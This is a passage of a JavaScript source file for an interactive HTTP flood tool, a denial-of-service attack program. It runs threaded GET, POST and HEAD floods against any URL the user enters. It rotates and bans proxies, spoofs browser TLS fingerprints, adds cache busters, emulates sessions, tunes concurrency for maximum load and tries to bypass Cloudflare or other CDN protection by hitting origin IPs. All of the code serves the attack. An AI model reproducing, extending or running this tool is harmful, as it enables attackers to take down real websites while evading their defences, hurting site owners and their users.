    } else {
        config.stats.failed++;
    }
    config.stats.bytesSent += bytesSent;
    config.stats.bytesReceived += bytesReceived;
    
    if (statusCode) {
        config.stats.statusCodes[statusCode] = (config.stats.statusCodes[statusCode] || 0) + 1;
    }
}

function displayStats() {
    const elapsed = (Date.now() - config.stats.startTime) / 1000;
    const reqRate = config.stats.totalRequests / elapsed;
    const successRate = config.stats.totalRequests > 0 
        ? (config.stats.successful / config.stats.totalRequests * 100).toFixed(1)
        : 0;
    const http2Percent = config.stats.totalRequests > 0
        ? ((config.stats.http2Requests / config.stats.totalRequests) * 100).toFixed(1)
        : 0;
    
    const memUsage = process.memoryUsage();
    const memMB = (memUsage.heapUsed / 1024 / 1024).toFixed(0);
    
    // Visual indicators
    const rateColor = reqRate > 10000 ? colors.green : reqRate > 5000 ? colors.yellow : colors.red;
    const successColor = successRate > 80 ? colors.green : successRate > 50 ? colors.yellow : colors.red;
    const patternIcon = config.attackPattern === 'burst' ? '⚡' : config.attackPattern === 'steady' ? '▶' : '↔';
    
    console.log('\n' + colors.cyan + '═'.repeat(70) + colors.reset);
    console.log(`${colors.bright}${colors.blue}${icons.chart} PERFORMANCE METRICS${colors.reset}`);
    console.log(colors.cyan + '─'.repeat(70) + colors.reset);
    
    // Main stats line
    console.log(`${colors.blue}${icons.clock} Time: ${colors.bright}${elapsed.toFixed(1)}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.magenta}${icons.target} Requests: ${colors.bright}${config.stats.totalRequests.toLocaleString()}${colors.reset} ${colors.dim}│${colors.reset} ${rateColor}${icons.fire} Rate: ${colors.bright}${reqRate.toFixed(0)} req/s${colors.reset}`);
    
    // Success/Fail line
    console.log(`${successColor}${icons.success} Success: ${colors.bright}${config.stats.successful.toLocaleString()}${colors.reset}${successColor} (${successRate}%)${colors.reset} ${colors.dim}│${colors.reset} ${colors.red}${icons.error} Failed: ${colors.bright}${config.stats.failed.toLocaleString()}${colors.reset}`);
    
    // Protocol info
    console.log(`${colors.cyan}${icons.info} HTTP/2: ${colors.bright}${config.stats.http2Requests}${colors.reset}${colors.cyan} (${http2Percent}%)${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}${icons.check} Conn Reuse: ${colors.bright}${config.stats.connectionReuse}${colors.reset}`);
    
    // Resources
    console.log(`${colors.yellow}${icons.info} Memory: ${colors.bright}${memMB}MB${colors.reset} ${colors.dim}│${colors.reset} ${colors.blue}Sent: ${colors.bright}${(config.stats.bytesSent / 1024).toFixed(0)} KB${colors.reset} ${colors.dim}│${colors.reset} ${colors.magenta}Received: ${colors.bright}${(config.stats.bytesReceived / 1024).toFixed(0)} KB${colors.reset}`);
    
    // Adaptive metrics
    const concurrencyBar = '█'.repeat(config.stats.adaptiveMetrics.currentConcurrency) + colors.dim + '░'.repeat(10 - config.stats.adaptiveMetrics.currentConcurrency) + colors.reset;
    console.log(colors.cyan + '─'.repeat(70) + colors.reset);
    console.log(`${colors.bright}${colors.green}[ADAPTIVE ENGINE]${colors.reset}`);
    console.log(`${colors.yellow}${patternIcon} Pattern: ${colors.bright}${config.attackPattern.toUpperCase()}${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}Concurrency: ${colors.bright}${config.stats.adaptiveMetrics.currentConcurrency}${colors.reset} ${colors.green}${concurrencyBar}${colors.reset}`);
    console.log(`${successColor}${icons.target} Success Rate: ${colors.bright}${config.stats.adaptiveMetrics.lastSuccessRate.toFixed(1)}%${colors.reset}`);
    
    if (Object.keys(config.stats.statusCodes).length > 0) {
        console.log(colors.cyan + '─'.repeat(70) + colors.reset);
        console.log(`${colors.magenta}${icons.info} Status Codes:${colors.reset}`);
        const codes = Object.entries(config.stats.statusCodes)
            .sort(([a], [b]) => b - a)
            .slice(0, 5)
            .map(([k, v]) => {
                const codeColor = k.startsWith('2') ? colors.green : k.startsWith('3') ? colors.blue : k.startsWith('4') ? colors.yellow : colors.red;
                return `${codeColor}${k}${colors.reset}${colors.dim}:${colors.reset}${colors.bright}${v}${colors.reset}`;
            })
            .join(' ${colors.dim}│${colors.reset} ');
        console.log(`  ${codes}`);
    }
    
    if (config.proxies.length > 0 && config.workingProxies.size > 0) {
        console.log(colors.cyan + '─'.repeat(70) + colors.reset);
        const proxyCount = config.workingProxies.size;
        const proxyColor = proxyCount > 100 ? colors.green : proxyCount > 50 ? colors.yellow : colors.red;
        console.log(`${proxyColor}${icons.check} Working Proxies: ${colors.bright}${proxyCount}${colors.reset}${proxyColor}/${config.proxies.length}${colors.reset}`);
    }
    
    console.log(colors.cyan + '═'.repeat(70) + colors.reset);
}

class HTTPFlood {
    constructor(url, duration, threads, method, useOrigin) {
        this.url = url;
        this.duration = duration;
        this.threads = threads;
        this.method = method;
        this.useOrigin = useOrigin;
        this.running = false;
        this.originIPs = [];
        this.domain = new URL(url).hostname;
    }
    
    async prepare() {
        console.log(`\n${colors.cyan}${'═'.repeat(70)}${colors.reset}`);
        console.log(`${colors.bright}${colors.red}${icons.target} ATTACK CONFIGURATION${colors.reset}`);
        console.log(`${colors.cyan}${'═'.repeat(70)}${colors.reset}`);
        console.log(`${colors.yellow}${icons.rocket} Method: ${colors.bright}${this.method}${colors.reset}`);
        console.log(`${colors.blue}${icons.target} Target: ${colors.bright}${this.url}${colors.reset}`);
        console.log(`${colors.magenta}${icons.clock} Duration: ${colors.bright}${this.duration}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}${icons.fire} Threads: ${colors.bright}${this.threads}${colors.reset}`);
        console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}ADAPTIVE${colors.reset}${colors.green} (3-10 concurrent/thread, auto-tuned)${colors.reset}`);
        console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}Rotating${colors.reset}${colors.yellow} (burst→steady→mixed, 30s cycles)${colors.reset}`);
        console.log(`${colors.magenta}${icons.check} Proxies: ${colors.bright}Weighted selection${colors.reset}${colors.magenta} (best 3x more likely)${colors.reset}`);
        console.log(`${colors.blue}${icons.info} Recovery: ${colors.bright}Exponential backoff${colors.reset}${colors.blue} + 30s temp bans${colors.reset}`);
        console.log(`${colors.cyan}${icons.success} Session: ${colors.bright}Cookie tracking${colors.reset}${colors.cyan} + 10 redirects + realistic navigation${colors.reset}`);
        console.log(`${colors.green}${icons.info} Protocol: ${colors.bright}HTTP/1.1 + HTTP/2${colors.reset}${colors.green} with TLS fingerprinting${colors.reset}`);
        console.log(`${colors.magenta}${icons.check} Fingerprint: ${colors.bright}${profile.name}${colors.reset}${colors.magenta} (randomized per thread)${colors.reset}`);
        console.log(`${colors.yellow}${icons.check} Connection: ${colors.bright}${config.proxies.length > 0 ? '2048' : '1024'} socket pool${colors.reset}${colors.yellow} + Keep-Alive${colors.reset}`);
        
        const baseRPS = config.proxies.length > 0 ? 250 : 500;
        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 50000 : 100000));
        console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
        console.log(`${colors.bright}${colors.green}${icons.fire} Estimated Throughput: ${colors.yellow}${estimatedRPS.toLocaleString()}${colors.reset}${colors.green} - ${colors.yellow}${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()}${colors.reset}${colors.green} req/s${colors.reset}`);
        
        if (this.threads > 100) {
            console.log(`${colors.yellow}${icons.warning} WARNING: ${colors.bright}${this.threads}${colors.reset}${colors.yellow} threads may overwhelm MacBook Air M2${colors.reset}`);
            console.log(`${colors.blue}${icons.info} Recommended: ${colors.bright}50-80 threads${colors.reset}${colors.blue} for optimal performance${colors.reset}`);
        }
        
        if (this.useOrigin && this.domain) {
            console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
            console.log(`${colors.magenta}${icons.target} Attempting CDN bypass...${colors.reset}`);
            this.originIPs = await discoverOriginIPs(this.domain);
        }
        
        if (config.proxies.length > 0) {
            console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
            console.log(`${colors.green}${icons.check} Using ${colors.bright}${config.proxies.length}${colors.reset}${colors.green} proxies with smart rotation${colors.reset}`);
            if (config.maxRPS) {
                console.log(`${colors.blue}${icons.info} RPS Limit: ${colors.bright}${config.maxRPS.toLocaleString()}${colors.reset}${colors.blue} requests/second (controlled)${colors.reset}`);
            }
            config.workingProxies.clear();
        } else {
            console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
            console.log(`${colors.red}${icons.warning} WARNING: Direct connection - your IP is visible!${colors.reset}`);
        }
        
        console.log(`${colors.cyan}${'═'.repeat(70)}${colors.reset}`);
        
        config.stats.startTime = Date.now();
        this.running = true;
    }
    
    async worker(threadId) {
        let proxyIndex = threadId % Math.max(config.proxies.length, 1);
        let failCount = 0;
        let successCount = 0;
        let localCount = 0;
        let cachedAgent = null;
        let lastProxyIndex = -1;
        let retryDelay = 100; // Exponential backoff starting at 100ms
        let cookieJar = {}; // Session emulation
        
        const profile = getRandomElement(BROWSER_PROFILES);
        const useProxy = config.proxies.length > 0;
        const isHttpsTarget = this.url.startsWith('https://');
        let concurrency = 3; // Adaptive: starts at 3, can go 3-10
        
        const endTime = Date.now() + this.duration * 1000;
        
        const makeRequest = async () => {
            const startTime = Date.now();
            
            try {
                const headers = getAdvancedHeaders(this.url, profile);
                
                // Add keep-alive for proxy compatibility
                if (useProxy) {
                    headers['Connection'] = 'keep-alive';
                }
                
                // Session emulation: Add cookies if we have them
                if (Object.keys(cookieJar).length > 0) {
                    headers['Cookie'] = Object.entries(cookieJar)
                        .map(([k, v]) => `${k}=${v}`)
                        .join('; ');
                }
                
                let targetUrl = this.url;
                
                if (this.originIPs.length > 0 && this.useOrigin) {
                    const originIP = getRandomElement(this.originIPs);
                    if (originIP !== this.domain) {
                        targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
                        headers['Host'] = this.domain;
                    }
                }
                
                targetUrl = addCacheBuster(targetUrl);
                
                // Reuse agent per thread for better connection handling
                if (useProxy) {
                    if (proxyIndex !== lastProxyIndex || !cachedAgent) {
                        const proxy = config.proxies[proxyIndex];
                        
                        // Create agent with TLS fingerprinting for target
                        const agentTlsOptions = {
                            rejectUnauthorized: false,
                            ciphers: profile.tls.ciphers,
                            minVersion: profile.tls.minVersion,
                            maxVersion: profile.tls.maxVersion,
                            ecdhCurve: profile.tls.ecdhCurve,
                            honorCipherOrder: true,
                            keepAlive: true,
                            keepAliveMsecs: 1000,
                            maxSockets: 2048,
                            maxFreeSockets: 1024,
                            timeout: 10000
                        };
                        
                        if (profile.tls.sigalgs) {
                            agentTlsOptions.sigalgs = profile.tls.sigalgs;
                        }
                        
                        cachedAgent = isHttpsTarget
                            ? new HttpsProxyAgent(proxy, agentTlsOptions)
                            : new HttpProxyAgent(proxy, { 
                                keepAlive: true,
                                maxSockets: 2048,
                                maxFreeSockets: 1024,
                                timeout: 10000 
                              });
                        lastProxyIndex = proxyIndex;
                    }
                } else {
                    // Direct connection - create TLS agent with fingerprint
                    if (!cachedAgent) {
                        cachedAgent = createTLSAgent(profile, null);
                    }
                }
                
                const axiosConfig = {
                    method: this.method.toLowerCase(),
                    url: targetUrl,
                    headers,
                    timeout: useProxy ? 10000 : 5000,
                    maxRedirects: 10, // Follow all redirects
                    validateStatus: () => true,
                    decompress: true,
                    // Preserve cookies across redirects
                    withCredentials: true,
                    // Follow redirects and maintain session
                    beforeRedirect: (options, responseDetails) => {
                        // Preserve cookies on redirect
                        if (responseDetails.headers['set-cookie']) {
                            const cookies = Array.isArray(responseDetails.headers['set-cookie'])
                                ? responseDetails.headers['set-cookie']
                                : [responseDetails.headers['set-cookie']];
                            cookies.forEach(cookie => {
                                const [pair] = cookie.split(';');
                                const [key, value] = pair.split('=');
                                if (key && value) cookieJar[key.trim()] = value.trim();
                            });
                            
                            // Add cookies to redirect request
                            options.headers['Cookie'] = Object.entries(cookieJar)
                                .map(([k, v]) => `${k}=${v}`)
                                .join('; ');
                        }
                    }
                };
                
                if (useProxy && cachedAgent) {
                    // Set only the correct agent based on target protocol
                    if (isHttpsTarget) {
                        axiosConfig.httpsAgent = cachedAgent;
                    } else {
                        axiosConfig.httpAgent = cachedAgent;
                    }
                    axiosConfig.proxy = false;
                }
                
                if (this.method === 'POST') {
                    const postData = generateRandomPostData();
                    axiosConfig.data = postData;
                    axiosConfig.headers['Content-Type'] = postData.startsWith('{')
                        ? 'application/json'
                        : 'application/x-www-form-urlencoded';
                }
                
                const response = await axios(axiosConfig);
                const latency = Date.now() - startTime;
                
                // Session emulation: Extract and store cookies
                if (response.headers['set-cookie']) {
                    const cookies = Array.isArray(response.headers['set-cookie'])
                        ? response.headers['set-cookie']
                        : [response.headers['set-cookie']];
                    cookies.forEach(cookie => {
                        const [pair] = cookie.split(';');
                        const [key, value] = pair.split('=');
                        if (key && value) cookieJar[key.trim()] = value.trim();
                    });
                }
                
                // Track HTTP/2 usage
                if (response.request?.socket?.alpnProtocol === 'h2') {
                    config.stats.http2Requests++;
                }
                
                const bytesSent = axiosConfig.data ? String(axiosConfig.data).length : 500;
                const bytesReceived = response.data ? String(response.data).length : 0;
                
                updateStats(true, response.status, bytesSent, bytesReceived);
                
                successCount++;
                failCount = 0;
                retryDelay = 100; // Reset backoff on success
                
                if (useProxy && successCount % 20 === 0) {
                    const proxyIP = config.proxies[proxyIndex].replace(/^https?:\/\//, '').split(':')[0];
                    config.workingProxies.add(proxyIP);
                }
                
                if (config.debug && localCount === 0) {
                    console.log(`[DEBUG] T${threadId}: SUCCESS - Status: ${response.status} - Latency: ${latency}ms - Proxy: ${useProxy ? 'YES' : 'NO'}`);
                }
                
                localCount++;
                
            } catch (error) {
                const latency = Date.now() - startTime;
                updateStats(false);
                
                failCount++;
                
                const errorCode = error.code || 'UNKNOWN';
                
                if (config.debug && failCount <= 3) {
                    console.log(`[DEBUG] T${threadId}: ERROR - ${errorCode} - ${error.message?.substring(0, 50)} - Proxy: ${useProxy ? config.proxies[proxyIndex].substring(0, 20) : 'NO'}`);
                }
                
                // Handle connection reset errors with exponential backoff
                if (useProxy && (errorCode === 'ECONNRESET' || errorCode === 'ECONNREFUSED' || errorCode === 'EPIPE')) {
                    cachedAgent = null;
                    
                    if (failCount >= 3) {
                        // Temp ban proxy for 30 seconds
                        const currentProxy = config.proxies[proxyIndex];
                        config.proxyBanList.set(currentProxy, Date.now() + 30000);
                        
                        if (config.debug) {
                            console.log(`[DEBUG] T${threadId}: Banned proxy for 30s after ${failCount} fails`);
                        }
                        
                        proxyIndex = (proxyIndex + 1) % config.proxies.length;
                        failCount = 0;
                        retryDelay = 100;
                    } else {
                        // Exponential backoff: 100ms, 200ms, 400ms
                        await new Promise(resolve => setTimeout(resolve, retryDelay));
                        retryDelay = Math.min(retryDelay * 2, 800);
                    }
                } else if (useProxy && failCount >= 5) {
                    // Ban after 5 fails for other errors
                    const currentProxy = config.proxies[proxyIndex];
                    config.proxyBanList.set(currentProxy, Date.now() + 30000);
                    cachedAgent = null;
                    proxyIndex = (proxyIndex + 1) % config.proxies.length;
                    failCount = 0;
                    retryDelay = 100;
                }
            }
        };
        
        // Run requests with adaptive concurrency
        while (this.running && Date.now() < endTime) {
            // Adaptive concurrency: adjust based on success rate
            if (localCount > 0 && localCount % 50 === 0) {
                const currentSuccessRate = (successCount / localCount) * 100;
                
                if (currentSuccessRate > 85 && concurrency < 10) {
                    concurrency++;
                    if (config.debug) {
                        console.log(`[ADAPTIVE] T${threadId}: Increased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
                    }
                } else if (currentSuccessRate < 50 && concurrency > 3) {
                    concurrency--;
                    if (config.debug) {
                        console.log(`[ADAPTIVE] T${threadId}: Decreased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
                    }
                }
                
                config.stats.adaptiveMetrics.lastSuccessRate = currentSuccessRate;
                config.stats.adaptiveMetrics.currentConcurrency = concurrency;
            }
            
            const batch = [];
            for (let i = 0; i < concurrency; i++) {
                if (this.running && Date.now() < endTime) {
                    batch.push(makeRequest());
                }
            }
            
            await Promise.all(batch);
            
            // Pattern-based delay rotation
            const patternDelay = rotateAttackPattern();
            if (patternDelay > 0) {
                await new Promise(resolve => setTimeout(resolve, patternDelay));
            }
            
            // Check RPS limit if enabled
            if (config.maxRPS && useProxy) {
                const elapsed = (Date.now() - config.stats.startTime) / 1000;
                const currentRate = config.stats.totalRequests / elapsed;
                if (currentRate > config.maxRPS) {
                    await new Promise(resolve => setTimeout(resolve, 30));
                }
            }
        }
    }
    
    async start() {
        await this.prepare();
        
        console.log(`\n${colors.bright}${colors.green}${icons.rocket} LAUNCHING ATTACK...${colors.reset}\n`);
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker(i));
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => {
            this.running = false;
        }, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        
        displayStats();
        console.log(`\n${colors.bright}${colors.green}${icons.success} ATTACK COMPLETED!${colors.reset}\n`);
    }
}

async function main() {
    console.log(BANNER);
    
    const debugInput = await question('[?] Enable debug mode? (y/n): ');
    config.debug = debugInput.toLowerCase() === 'y';
    
    let targetUrl = null;
    let validateProxies = false;
    
    const proxyInput = await question('[?] Use proxies? (y/n): ');
    if (proxyInput.toLowerCase() === 'y') {
        const validateInput = await question('[?] Validate proxies against target? (recommended) (y/n): ');
        validateProxies = validateInput.toLowerCase() === 'y';
        
        if (validateProxies) {
            targetUrl = await question('[>] Enter target URL for validation (e.g., https://example.com): ');
            if (!targetUrl.startsWith('http')) {
                targetUrl = 'https://' + targetUrl;
            }
            console.log(`[*] Will validate proxies against: ${targetUrl}\n`);
        }
        
        const loaded = await loadProxies('proxies.txt', targetUrl, validateProxies);
        if (!loaded) {
            const continueInput = await question('[?] Continue without proxies? (y/n): ');
            if (continueInput.toLowerCase() !== 'y') {
                console.log('[!] Exiting...');
                rl.close();
                process.exit(0);
            }
        } else {
            const rpsInput = await question('[?] Set max RPS limit? (leave empty for unlimited): ');
            if (rpsInput && !isNaN(rpsInput)) {
                config.maxRPS = parseInt(rpsInput);
                console.log(`[*] RPS limited to: ${config.maxRPS.toLocaleString()} req/s\n`);
            }
        }
    }
    
    console.log('\n[SELECT ATTACK TYPE]');
    console.log('  1. HTTP GET Flood (Ultra-Fast)');
    console.log('  2. HTTP POST Flood (Ultra-Fast)');
    console.log('  3. HTTP HEAD Flood');
    
    const choice = await question('\n[>] Select attack (1-3): ');
    
    if (['1', '2', '3'].includes(choice)) {
        let finalUrl = targetUrl;
        
        if (!finalUrl) {
            const url = await question('[>] Enter target URL (e.g., example.com or https://example.com): ');
            finalUrl = url.trim();
        }
        
        if (!finalUrl.startsWith('http')) {
            finalUrl = 'https://' + finalUrl;
            console.log(`[*] Added HTTPS protocol: ${finalUrl}`);
        }
        
        const duration = parseInt(await question('[>] Duration (seconds): '));
        const threads = parseInt(await question('[>] Number of threads (10-500): '));
        
        const bypassCF = await question('[?] Attempt Cloudflare/CDN bypass? (y/n): ');
        const useOrigin = bypassCF.toLowerCase() === 'y';
        
        const method = choice === '1' ? 'GET' : choice === '2' ? 'POST' : 'HEAD';
        
        const attack = new HTTPFlood(finalUrl, duration, threads, method, useOrigin);
        await attack.start();
    } else {
        console.log('[!] Invalid choice!');
    }
    
    rl.close();
    process.exit(0);
}

if (require.main === module) {
    main().catch(err => {
        console.error('\n[!] Error:', err.message);
        rl.close();
        process.exit(1);
    });
}
